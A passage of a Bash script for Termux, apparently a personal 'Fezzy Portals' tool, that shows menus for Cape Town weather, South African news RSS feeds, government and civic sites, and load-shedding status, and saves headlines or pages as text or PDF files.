            printf "  ${C20}%2d.${RESET}  ${WH}%s${RESET}\n" "$((i+1))" "${_titles[$i]}"
        done
        echo ""
        printf "  ${FADE}0. Back${RESET}\n"
        echo ""
        printf "  ${C20}Choose article (0 to back): ${RESET}"
        read -r art_ch

        if [[ "$art_ch" == "0" ]] || [[ -z "$art_ch" ]]; then
            return
        fi

        if [[ "$art_ch" =~ ^[0-9]+$ ]] && ((art_ch >= 1 && art_ch <= ${#_titles[@]})); then
            local link="${_links[$((art_ch-1))]}"
            if [[ -z "$link" ]]; then
                printf "  ${RED}No link found for that article${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                return
            fi
            echo ""
            printf "  ${C20}[T]${RESET} ${WH}Save as TXT   ${C20}[B]${RESET} ${WH}Open in Browser (print → Save as PDF)${RESET}\n"
            echo ""
            printf "  ${C20}Choice » ${RESET}"; read -r art_action
            case "${art_action,,}" in
                t)
                    local art_slug art_txt
                    art_slug=$(echo "${_titles[$((art_ch-1))]}" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]/_/g' | cut -c1-40)
                    art_txt="$NEWSDIR/article_${art_slug}_$(date +%Y%m%d_%H%M%S).txt"
                    printf "  ${C20}[*] Fetching article as text...${RESET}\n"
                    {
                        echo "FEZZY PORTALS — Article Save"
                        echo "Title : ${_titles[$((art_ch-1))]}"
                        echo "URL   : $link"
                        echo "Date  : $(date)"
                        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                        echo ""
                        curl -sL --max-time 15 \
                            -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                            "$link" 2>/dev/null \
                            | sed 's/<[^>]*>//g' \
                            | sed '/^[[:space:]]*$/d' \
                            | sed 's/&amp;/\&/g; s/&lt;/</g; s/&gt;/>/g; s/&#39;/'"'"'/g'
                    } > "$art_txt" 2>/dev/null
                    if [[ -f "$art_txt" && -s "$art_txt" ]]; then
                        printf "  ${GRN}✓ Saved: %s${RESET}\n" "$art_txt"
                        cp "$art_txt" /sdcard/Download/ 2>/dev/null \
                            && printf "  ${GRN}✓ Also copied to /sdcard/Download/${RESET}\n"
                        echo ""
                        printf "  ${C20}[P]${RESET} ${WH}Preview first 20 lines? [p/ENTER skip]: ${RESET}"; read -r prev_ch
                        [[ "${prev_ch,,}" == "p" ]] && echo "" && head -20 "$art_txt" | sed 's/^/  /'
                    else
                        printf "  ${RED}✗ Fetch failed — check connection${RESET}\n"
                    fi
                    ;;
                b)
                    termux-open-url "$link" 2>/dev/null
                    printf "  ${FADE}Opened in browser — use browser Print → Save as PDF.${RESET}\n"
                    ;;
                *)
                    printf "  ${FADE}Cancelled.${RESET}\n" ;;
            esac
        else
            printf "  ${RED}Invalid choice${RESET}\n"
            sleep 0.7
        fi
    }

    # ── Cookie jar shared across all news curl calls ──
    local FEZZY_COOKIES="/tmp/fezzy_news_cookies.txt"
    touch "$FEZZY_COOKIES" 2>/dev/null

    # ── Radio removed v73 — replaced with Civic/Gov portal ──

    while true; do
        clear
        _portal_entry "News Portal" "${C20}"
        echo ""
        _dv20
        printf "  ${C20}${BOLD}NEWS PORTAL  —  Cape Town · SA · Civic · Weather  ·  SOI  ${RESET}\n"
        _dv20
        echo ""
        printf "  ${WH}Cape Town papers · SASSA · SAPS · Home Affairs · weather · load shedding · PDF${RESET}\n"
        printf "  ${FADE}■ Stay informed · Bojack watches the door · you watch the feed · 999${RESET}\n"
        echo ""
        _dv20
        echo ""
        printf "  ${C20}${BOLD}── WEATHER ────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[1]  Cape Town Weather      — live forecast via wttr.in              ${RESET}\n"
        echo ""
        printf "  ${C20}${BOLD}── NEWS SOURCES ───────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[2]  News24                 — top SA headlines                       ${RESET}\n"
        printf "  ${WH}[3]  EWN                   — Eyewitness News SA                     ${RESET}\n"
        printf "  ${WH}[4]  Daily Voice            — Cape Town community news               ${RESET}\n"
        printf "  ${WH}[5]  GroundUp               — social justice Cape Town               ${RESET}\n"
        printf "  ${WH}[6]  Netwerk24              — Afrikaans SA news (bilingual)          ${RESET}\n"
        printf "  ${WH}[7]  IOL News               — Independent Online SA                 ${RESET}\n"
        printf "  ${WH}[30] Google News SA        — live SA headlines via Google RSS        ${RESET}\n"
        printf "  ${WH}[31] Cape Town Local       — Google News Cape Town filter            ${RESET}\n"
        printf "  ${WH}[32] Google News ZA Crime  — crime & safety news filter             ${RESET}\n"
        printf "  ${WH}[33] Google News Load Shed — load shedding news filter              ${RESET}\n"
        printf "  ${WH}[8]  All Sources Sweep     — all feeds at once (incl. Google News)  ${RESET}\n"
        echo ""
        printf "  ${C20}${BOLD}── GOVERNMENT & CIVIC ─────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[9]  SASSA Info            — services, grants, office finder            ${RESET}\n"
        printf "  ${WH}[10] SAPS Search           — crime stats, wanted persons, station finder ${RESET}\n"
        printf "  ${WH}[11] Home Affairs          — ID / passport status & info                ${RESET}\n"
        printf "  ${WH}[12] Know Your Rights      — Legal Aid SA, tenant & labour rights        ${RESET}\n"
        printf "  ${WH}[13] SASSA Payment Dates   — current grant payment schedule              ${RESET}\n"
        printf "  ${WH}[14] Community Safety      — Cape Town safety & crime news feed          ${RESET}\n"
        echo ""
        printf "  ${C20}${BOLD}── LOAD SHEDDING & CITY ───────────────────────────────────────${RESET}\n"
        printf "  ${WH}[25] Load Shedding Status   — live stage check (Eskom API)           ${RESET}\n"
        printf "  ${WH}[26] City of Cape Town Feed — official city announcements            ${RESET}\n"
        echo ""
        printf "  ${C20}${BOLD}── SAVE & ARCHIVE ─────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[27] Save Headlines to TXT  — timestamped snapshot                   ${RESET}\n"
        printf "  ${WH}[28] Daily Newspaper PDF   — Google News SA + 4 feeds (newspaper style)${RESET}\n"
        printf "  ${WH}[29] Browse Saved Files     — view all saved in %s ${RESET}\n" "$NEWSDIR"
        printf "  ${WH}[34] Single Article → PDF   — pick one headline, save as PDF offline  ${RESET}\n"
        printf "  ${WH}[35] Bulk Top 10 → PDF      — save all top 10 Google News SA as PDFs  ${RESET}\n"
        printf "  ${WH}[36] Keyword Filter         — search headlines for a specific word     ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv20
        echo ""
        printf "  ${C20}${BOLD}Choice » ${RESET}"
        read -r ch

        case "$ch" in
            1)
                echo ""
                printf "  ${C20}[*] Cape Town Weather${RESET}\n\n"
                local wx_json wx_temp wx_feel wx_hum wx_wind wx_cond wx_emoji
                wx_json=$(curl -s --max-time 8 \
                    -H "User-Agent: Mozilla/5.0 (Android 14; Mobile)" \
                    "https://wttr.in/Cape+Town?format=j1" 2>/dev/null)
                if [[ -n "$wx_json" ]]; then
                    wx_temp=$(echo "$wx_json" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['current_condition'][0]['temp_C'])" 2>/dev/null || echo "?")
                    wx_feel=$(echo "$wx_json" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['current_condition'][0]['FeelsLikeC'])" 2>/dev/null || echo "?")
                    wx_hum=$(echo "$wx_json"  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['current_condition'][0]['humidity'])" 2>/dev/null || echo "?")
                    wx_wind=$(echo "$wx_json" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['current_condition'][0]['windspeedKmph'])" 2>/dev/null || echo "?")
                    wx_cond=$(echo "$wx_json" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['current_condition'][0]['weatherDesc'][0]['value'])" 2>/dev/null || echo "Unknown")
                    # Map condition to emoji
                    case "${wx_cond,,}" in
                        *sun*|*clear*)    wx_emoji="☀️" ;;
                        *cloud*|*overcast*) wx_emoji="☁️" ;;
                        *rain*|*drizzle*) wx_emoji="🌧️" ;;
                        *thunder*|*storm*) wx_emoji="⛈️" ;;
                        *snow*|*sleet*)   wx_emoji="❄️" ;;
                        *fog*|*mist*)     wx_emoji="🌫️" ;;
                        *wind*)           wx_emoji="💨" ;;
                        *partly*)         wx_emoji="⛅" ;;
                        *)                wx_emoji="🌡️" ;;
                    esac
                    echo ""
                    printf "  %s  ${WH}${BOLD}%s°C${RESET}  ${FADE}Feels like %s°C${RESET}\n" "$wx_emoji" "$wx_temp" "$wx_feel"
                    printf "  💧 ${WH}Humidity: %s%%${RESET}  💨 ${WH}Wind: %s km/h${RESET}\n" "$wx_hum" "$wx_wind"
                    printf "  📍 ${WH}%s${RESET}  ${FADE}Cape Town${RESET}\n" "$wx_cond"
                    echo ""
                    # 3-day forecast
                    printf "  ${C20}${BOLD}── 3-Day Forecast ──────────────────────${RESET}\n"
                    echo "$wx_json" | python3 -c "
import sys,json
d=json.load(sys.stdin)
days=['Today','Tomorrow','Day 3']
emojis={'Sun':'☀️','Cloud':'☁️','Rain':'🌧️','Thunder':'⛈️','Snow':'❄️','Fog':'🌫️','Mist':'🌫️','Partly':'⛅','Clear':'☀️'}
for i,w in enumerate(d.get('weather',[])[:3]):
    desc=w['hourly'][4]['weatherDesc'][0]['value'] if w['hourly'] else 'N/A'
    hi=w.get('maxtempC','?'); lo=w.get('mintempC','?')
    em='🌡️'
    for k,v in emojis.items():
        if k.lower() in desc.lower(): em=v; break
    print(f'  {em}  {days[i]:<9}  ↑{hi}°C  ↓{lo}°C  {desc}')
" 2>/dev/null || printf "  ${FADE}Forecast unavailable${RESET}\n"
                else
                    printf "  ${RED}No connection — check data or WiFi${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                _news_fetch "News24" "https://feeds.news24.com/articles/news24/TopStories/rss" ;;
            3)
                _news_fetch "EWN" "https://ewn.co.za/RSS%20Feeds/South-Africa" ;;
            4)
                _news_fetch "Daily Voice" "https://www.dailyvoice.co.za/feed" ;;
            5)
                _news_fetch "GroundUp" "https://www.groundup.org.za/feeds/latest/" ;;
            6)
                _news_fetch "Netwerk24" "https://www.netwerk24.com/rss" ;;
            7)
                _news_fetch "IOL News" "https://www.iol.co.za/rss/" ;;
            30)
                _news_fetch "Google News SA" "https://news.google.com/rss?hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
            31)
                _news_fetch "Google News Cape Town" "https://news.google.com/rss/search?q=Cape+Town&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
            32)
                _news_fetch "Google News ZA Crime" "https://news.google.com/rss/search?q=South+Africa+crime+safety&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
            33)
                _news_fetch "Google News Load Shedding" "https://news.google.com/rss/search?q=load+shedding+South+Africa&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
            8)
                echo ""
                printf "  ${C20}[*] ALL SOURCES SWEEP — headlines only, no article picker${RESET}\n\n"
                _dv20
                local sweep_sources=(
                    "GOOGLE_NEWS_SA|https://news.google.com/rss?hl=en-ZA&gl=ZA&ceid=ZA:en"
                    "NEWS24|https://feeds.news24.com/articles/news24/TopStories/rss"
                    "EWN|https://ewn.co.za/RSS%20Feeds/South-Africa"
                    "GROUNDUP|https://www.groundup.org.za/feeds/latest/"
                    "DAILY_VOICE|https://www.dailyvoice.co.za/feed"
                    "IOL|https://www.iol.co.za/rss/"
                )
                for entry in "${sweep_sources[@]}"; do
                    local lbl="${entry%%|*}" surl="${entry##*|}"
                    printf "\n  ${C20}── %s ──${RESET}\n" "$lbl"
                    local sout
                    sout=$(curl -sL --max-time 5 "$surl" 2>/dev/null \
                        | sed 's/></>\n</g' \
                        | grep -o '<title>[^<]*</title>' \
                        | sed 's/<title>//g; s/<\/title>//g' \
                        | grep -v "^[[:space:]]*$" | tail -n +2 | head -n 5)
                    [[ -n "$sout" ]] && echo "$sout" | sed 's/^/  /' \
                        || printf "  ${RED}Could not fetch${RESET}\n"
                done
                echo ""; _dv20
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""
                printf "  ${C20}${BOLD}── SASSA INFORMATION ──────────────────────────────────────────${RESET}\n\n"
                printf "  ${WH}[1] View SASSA website (w3m)       — grants, offices, services${RESET}\n"
                printf "  ${WH}[2] Download SASSA info as PDF      — save for offline reference${RESET}\n"
                printf "  ${WH}[3] SASSA grants news               — Google News SASSA filter${RESET}\n"
                printf "  ${WH}[4] SASSA Cape Town news            — local office & branch news${RESET}\n"
                echo ""
                printf "  ${C20}Choice » ${RESET}"; read -r sassa_ch
                local sassa_url="https://www.sassa.gov.za"
                case "$sassa_ch" in
                    1)
                        if command -v w3m &>/dev/null; then
                            w3m "$sassa_url"
                        else
                            printf "  ${YEL}w3m not found — fetching via curl...${RESET}\n"
                            curl -sL --max-time 12 \
                                -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                                "$sassa_url" 2>/dev/null \
                                | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d' | head -80 | less -R
                        fi ;;
                    2)
                        local sassa_pdf="$NEWSDIR/sassa_info_$(date +%Y%m%d_%H%M%S).pdf"
                        printf "  ${C20}[*] Saving SASSA info as PDF...${RESET}\n"
                        local sav_s=0
                        if command -v wkhtmltopdf &>/dev/null; then
                            wkhtmltopdf --quiet --encoding utf-8 \
                                --margin-top 15mm --margin-bottom 15mm \
                                --margin-left 15mm --margin-right 15mm \
                                "$sassa_url" "$sassa_pdf" 2>/dev/null && sav_s=1
                        fi
                        if [[ $sav_s -eq 0 ]] && python3 -c "import weasyprint" 2>/dev/null; then
                            python3 -c "from weasyprint import HTML; HTML(url='$sassa_url').write_pdf('$sassa_pdf')" 2>/dev/null && sav_s=1
                        fi
                        if [[ $sav_s -eq 0 ]]; then
                            sassa_pdf="${sassa_pdf%.pdf}.txt"
                            curl -sL --max-time 12 \
                                -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                                "$sassa_url" 2>/dev/null \
                                | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d' | head -150 > "$sassa_pdf"
                            sav_s=1
                        fi
                        [[ $sav_s -eq 1 && -f "$sassa_pdf" ]] \
                            && printf "  ${GRN}✓ Saved: %s${RESET}\n" "$sassa_pdf" \
                            || printf "  ${RED}✗ Save failed${RESET}\n" ;;
                    3) _news_fetch "SASSA Grants News" "https://news.google.com/rss/search?q=SASSA+grants+South+Africa&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
                    4) _news_fetch "SASSA Cape Town"   "https://news.google.com/rss/search?q=SASSA+Cape+Town+office&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""
                printf "  ${C20}${BOLD}── SAPS SEARCH ────────────────────────────────────────────────${RESET}\n\n"
                printf "  ${WH}[1] SAPS website (w3m)              — main site, station finder${RESET}\n"
                printf "  ${WH}[2] Crime stats news pull            — Google News SAPS/crime filter${RESET}\n"
                printf "  ${WH}[3] Wanted persons news              — Google News wanted persons SA${RESET}\n"
                printf "  ${WH}[4] Download SAPS page as PDF        — save for offline reference${RESET}\n"
                printf "  ${WH}[5] Search SAPS topic                — custom Google News filter${RESET}\n"
                echo ""
                printf "  ${C20}Choice » ${RESET}"; read -r saps_ch
                local saps_url="https://www.saps.gov.za"
                case "$saps_ch" in
                    1)
                        if command -v w3m &>/dev/null; then
                            w3m "$saps_url"
                        else
                            curl -sL --max-time 12 \
                                -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                                "$saps_url" 2>/dev/null \
                                | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d' | head -80 | less -R
                        fi ;;
                    2) _news_fetch "SAPS Crime Stats"  "https://news.google.com/rss/search?q=SAPS+crime+statistics+South+Africa&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
                    3) _news_fetch "Wanted Persons SA" "https://news.google.com/rss/search?q=wanted+persons+South+Africa+SAPS&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
                    4)
                        local saps_pdf="$NEWSDIR/saps_info_$(date +%Y%m%d_%H%M%S).pdf"
                        printf "  ${C20}[*] Saving SAPS page as PDF...${RESET}\n"
                        local sav_p=0
                        if command -v wkhtmltopdf &>/dev/null; then
                            wkhtmltopdf --quiet --encoding utf-8 \
                                --margin-top 15mm --margin-bottom 15mm \
                                --margin-left 15mm --margin-right 15mm \
                                "$saps_url" "$saps_pdf" 2>/dev/null && sav_p=1
                        fi
                        if [[ $sav_p -eq 0 ]] && python3 -c "import weasyprint" 2>/dev/null; then
                            python3 -c "from weasyprint import HTML; HTML(url='$saps_url').write_pdf('$saps_pdf')" 2>/dev/null && sav_p=1
                        fi
                        if [[ $sav_p -eq 0 ]]; then
                            saps_pdf="${saps_pdf%.pdf}.txt"
                            curl -sL --max-time 12 \
                                -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                                "$saps_url" 2>/dev/null \
                                | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d' | head -150 > "$saps_pdf"
                        fi
                        [[ -f "$saps_pdf" ]] \
                            && printf "  ${GRN}✓ Saved: %s${RESET}\n" "$saps_pdf" \
                            || printf "  ${RED}✗ Save failed${RESET}\n" ;;
                    5)
                        echo ""
                        printf "  ${C20}Search term (e.g. 'Ravensmead crime'): ${RESET}"; read -r saps_q
                        if [[ -n "$saps_q" ]]; then
                            local sq; sq=$(echo "$saps_q" | sed 's/ /+/g')
                            _news_fetch "SAPS: $saps_q" \
                                "https://news.google.com/rss/search?q=${sq}+SAPS+South+Africa&hl=en-ZA&gl=ZA&ceid=ZA:en"
                        fi ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""
                printf "  ${C20}${BOLD}── HOME AFFAIRS ───────────────────────────────────────────────${RESET}\n\n"
                printf "  ${WH}[1] View Home Affairs website (w3m)  — ID, passport, civic services${RESET}\n"
                printf "  ${WH}[2] ID / Passport status news         — Google News DHA filter${RESET}\n"
                printf "  ${WH}[3] Download DHA info as PDF          — save for offline reference${RESET}\n"
                printf "  ${WH}[4] DHA Cape Town offices news         — latest branch/queue info${RESET}\n"
                echo ""
                printf "  ${C20}Choice » ${RESET}"; read -r dha_ch
                local dha_url="https://www.dha.gov.za"
                case "$dha_ch" in
                    1)
                        if command -v w3m &>/dev/null; then
                            w3m "$dha_url"
                        else
                            curl -sL --max-time 12 \
                                -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                                "$dha_url" 2>/dev/null \
                                | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d' | head -80 | less -R
                        fi ;;
                    2) _news_fetch "Home Affairs SA"   "https://news.google.com/rss/search?q=Home+Affairs+ID+passport+South+Africa&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
                    3)
                        local dha_pdf="$NEWSDIR/dha_info_$(date +%Y%m%d_%H%M%S).pdf"
                        printf "  ${C20}[*] Saving Home Affairs page as PDF...${RESET}\n"
                        local sav_d=0
                        if command -v wkhtmltopdf &>/dev/null; then
                            wkhtmltopdf --quiet --encoding utf-8 \
                                --margin-top 15mm --margin-bottom 15mm \
                                --margin-left 15mm --margin-right 15mm \
                                "$dha_url" "$dha_pdf" 2>/dev/null && sav_d=1
                        fi
                        if [[ $sav_d -eq 0 ]] && python3 -c "import weasyprint" 2>/dev/null; then
                            python3 -c "from weasyprint import HTML; HTML(url='$dha_url').write_pdf('$dha_pdf')" 2>/dev/null && sav_d=1
                        fi
                        if [[ $sav_d -eq 0 ]]; then
                            dha_pdf="${dha_pdf%.pdf}.txt"
                            curl -sL --max-time 12 \
                                -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                                "$dha_url" 2>/dev/null \
                                | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d' | head -150 > "$dha_pdf"
                        fi
                        [[ -f "$dha_pdf" ]] \
                            && printf "  ${GRN}✓ Saved: %s${RESET}\n" "$dha_pdf" \
                            || printf "  ${RED}✗ Save failed${RESET}\n" ;;
                    4) _news_fetch "DHA Cape Town" "https://news.google.com/rss/search?q=Home+Affairs+Cape+Town&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12)
                echo ""
                printf "  ${C20}${BOLD}── KNOW YOUR RIGHTS · LEGAL AID SA ────────────────────────────${RESET}\n\n"
                printf "  ${WH}[1] Legal Aid SA website (w3m)      — free legal help, contacts${RESET}\n"
                printf "  ${WH}[2] Download Legal Aid info as PDF   — save for offline reference${RESET}\n"
                printf "  ${WH}[3] Tenant rights news               — Google News tenant rights SA${RESET}\n"
                printf "  ${WH}[4] Labour rights news               — Google News labour law SA${RESET}\n"
                printf "  ${WH}[5] Constitutional rights news        — Google News rights SA${RESET}\n"
                echo ""
                printf "  ${C20}Choice » ${RESET}"; read -r lgl_ch
                local lgl_url="https://www.legal-aid.co.za"
                case "$lgl_ch" in
                    1)
                        if command -v w3m &>/dev/null; then
                            w3m "$lgl_url"
                        else
                            curl -sL --max-time 12 \
                                -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                                "$lgl_url" 2>/dev/null \
                                | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d' | head -80 | less -R
                        fi ;;
                    2)
                        local lgl_pdf="$NEWSDIR/legal_aid_info_$(date +%Y%m%d_%H%M%S).pdf"
                        printf "  ${C20}[*] Saving Legal Aid info as PDF...${RESET}\n"
                        local sav_l=0
                        if command -v wkhtmltopdf &>/dev/null; then
                            wkhtmltopdf --quiet --encoding utf-8 \
                                --margin-top 15mm --margin-bottom 15mm \
                                --margin-left 15mm --margin-right 15mm \
                                "$lgl_url" "$lgl_pdf" 2>/dev/null && sav_l=1
                        fi
                        if [[ $sav_l -eq 0 ]] && python3 -c "import weasyprint" 2>/dev/null; then
                            python3 -c "from weasyprint import HTML; HTML(url='$lgl_url').write_pdf('$lgl_pdf')" 2>/dev/null && sav_l=1
                        fi
                        if [[ $sav_l -eq 0 ]]; then
                            lgl_pdf="${lgl_pdf%.pdf}.txt"
                            curl -sL --max-time 12 \
                                -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                                "$lgl_url" 2>/dev/null \
                                | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d' | head -150 > "$lgl_pdf"
                        fi
                        [[ -f "$lgl_pdf" ]] \
                            && printf "  ${GRN}✓ Saved: %s${RESET}\n" "$lgl_pdf" \
                            || printf "  ${RED}✗ Save failed${RESET}\n" ;;
                    3) _news_fetch "Tenant Rights SA"      "https://news.google.com/rss/search?q=tenant+rights+South+Africa+eviction&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
                    4) _news_fetch "Labour Rights SA"       "https://news.google.com/rss/search?q=labour+law+workers+rights+South+Africa&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
                    5) _news_fetch "Constitutional Rights"  "https://news.google.com/rss/search?q=constitutional+rights+South+Africa&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            13) _news_fetch "SASSA Payment Dates" "https://news.google.com/rss/search?q=SASSA+payment+dates+grant&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
            14) _news_fetch "Community Safety CT" "https://news.google.com/rss/search?q=Cape+Town+community+safety+crime&hl=en-ZA&gl=ZA&ceid=ZA:en" ;;
            25)
                echo ""
                printf "  ${C20}[*] Eskom load shedding status...${RESET}\n\n"
                local ls_raw
                ls_raw=$(curl -s --max-time 5 "https://loadshedding.eskom.co.za/LoadShedding/GetStatus" 2>/dev/null)
                if [[ -n "$ls_raw" ]]; then
                    local stage
                    stage=$(echo "$ls_raw" | tr -d '"' | tr -d ' ')
                    if [[ "$stage" == "1" ]]; then
                        printf "  ${GRN}✓ NO LOAD SHEDDING — Stage 0${RESET}\n"
                    elif [[ "$stage" =~ ^[0-9]+$ ]]; then
                        printf "  ${RED}⚡ STAGE %d ACTIVE${RESET}\n" "$((stage - 1))"
                    else
                        printf "  ${YEL}Status: %s${RESET}\n" "$ls_raw"
                    fi
                else
                    printf "  ${RED}Could not reach Eskom API${RESET}\n"
                    printf "  ${FADE}Manual: https://loadshedding.co.za${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            26)
                _news_fetch "City of Cape Town" "https://www.capetown.gov.za/Feeds/City%20news" ;;
            27)
                echo ""
                local snap="$NEWSDIR/headlines_$(date +%Y%m%d_%H%M%S).txt"
                mkdir -p "$NEWSDIR" 2>/dev/null
                printf "  ${C20}[*] Saving all headlines to TXT...${RESET}\n\n"

                _save_rss_txt() {
                    local name="$1" url="$2" limit="${3:-8}"
                    printf "  ${FADE}Fetching %s...${RESET}\n" "$name"
                    local raw
                    raw=$(curl -sL --max-time 10 \
                        -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                        -H "Accept: application/rss+xml, application/xml, text/xml, */*" \
                        "$url" 2>/dev/null | sed 's/></>\n</g')
                    echo "=== $name ===" >> "$snap"
                    if [[ -z "$raw" ]]; then
                        echo "  [No data — check connection]" >> "$snap"
                    else
                        echo "$raw" \
                            | grep -o '<title>[^<]*</title>' \
                            | sed 's/<title>//g;s/<\/title>//g;s/&amp;/\&/g;s/&#39;/'"'"'/g;s/&lt;/</g;s/&gt;/>/g;s/&quot;/"/g' \
                            | grep -v "^[[:space:]]*$" | tail -n +2 | head -n "$limit" \
                            | while read -r line; do echo "  · $line"; done >> "$snap"
                    fi
                    echo "" >> "$snap"
                }

                {
                    echo "FEZZY PORTALS v1 Enhanced — NEWS SNAPSHOT"
                    echo "Strategy Over Impulse · philfesters · 999"
                    echo "Date: $(date)"
                    echo "Weather: $(curl -s --max-time 5 'https://wttr.in/Cape+Town?format=3' 2>/dev/null || echo 'N/A')"
                    echo "============================================"
                    echo ""
                } > "$snap"

                _save_rss_txt "Google News SA"  "https://news.google.com/rss?hl=en-ZA&gl=ZA&ceid=ZA:en" 10
                _save_rss_txt "News24"          "https://feeds.news24.com/articles/news24/TopStories/rss" 8
                _save_rss_txt "EWN"             "https://ewn.co.za/RSS%20Feeds/South-Africa" 6
                _save_rss_txt "GroundUp"        "https://www.groundup.org.za/feeds/latest/" 6
                _save_rss_txt "Daily Voice"     "https://www.dailyvoice.co.za/feed" 6

                echo "============================================" >> "$snap"
                echo "Saved by Fezzy Portals v1 Enhanced · 999" >> "$snap"

                echo ""
                printf "  ${GRN}✓ Saved → %s${RESET}\n" "$snap"
                echo ""
                termux-open "$snap" 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            28)
                echo ""
                printf "  ${C20}[*] Daily Newspaper PDF — Building...${RESET}\n\n"

                # ── Auto-install wkhtmltopdf if missing ──
                if ! command -v wkhtmltopdf &>/dev/null; then
                    printf "  ${YEL}wkhtmltopdf not found — installing...${RESET}\n"
                    pkg install wkhtmltopdf -y 2>/dev/null \
                        && printf "  ${GRN}✓ wkhtmltopdf installed${RESET}\n" \
                        || printf "  ${RED}Install failed — will try weasyprint fallback${RESET}\n"
                fi

                # ── Paths ──
                local npdir="$HOME/news_paper"
                mkdir -p "$npdir" "$NEWSDIR" 2>/dev/null
                local pdfout="$npdir/daily_news.pdf"
                local htmlout="$npdir/daily_news.html"

                printf "  ${FADE}Fetching weather...${RESET}\n"
                local wx_line wx_json wx_temp wx_cond
                wx_json=$(curl -s --max-time 8 -H "User-Agent: Mozilla/5.0 (Android 14; Mobile)" "https://wttr.in/Cape+Town?format=j1" 2>/dev/null)
                wx_temp=$(echo "$wx_json" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['current_condition'][0]['temp_C'])" 2>/dev/null || echo "?")
                wx_cond=$(echo "$wx_json" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['current_condition'][0]['weatherDesc'][0]['value'])" 2>/dev/null || echo "?")
                wx_line="🌡️ ${wx_temp}°C · ${wx_cond} · Cape Town"

                # ── Helper: RSS → clean HTML article blocks ──
                _pdf_rss_block() {
                    local section_name="$1" rss_url="$2" limit="${3:-8}"
                    local raw titles_arr links_arr seen_titles=""
                    printf "  ${FADE}Fetching %s...${RESET}\n" "$section_name" >&2
                    raw=$(curl -sL --max-time 10 \
                        -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
                        -H "Accept: application/rss+xml, application/xml, text/xml, */*" \
                        --cookie "$FEZZY_COOKIES" --cookie-jar "$FEZZY_COOKIES" \
                        "$rss_url" 2>/dev/null | sed 's/></>\n</g')
                    sleep $((RANDOM % 2 + 1))
                    [[ -z "$raw" ]] && { echo "<p class='err'>⚠ Could not fetch $section_name</p>"; return; }

                    mapfile -t titles_arr < <(echo "$raw" \
                        | grep -o '<title>[^<]*</title>' \
                        | sed 's/<title>//g;s/<\/title>//g;s/&amp;/\&/g;s/&#39;/'"'"'/g;s/&lt;/</g;s/&gt;/>/g;s/&quot;/"/g' \
                        | grep -v "^[[:space:]]*$" | tail -n +2 | head -n "$limit")
                    mapfile -t dates_arr  < <(echo "$raw" \
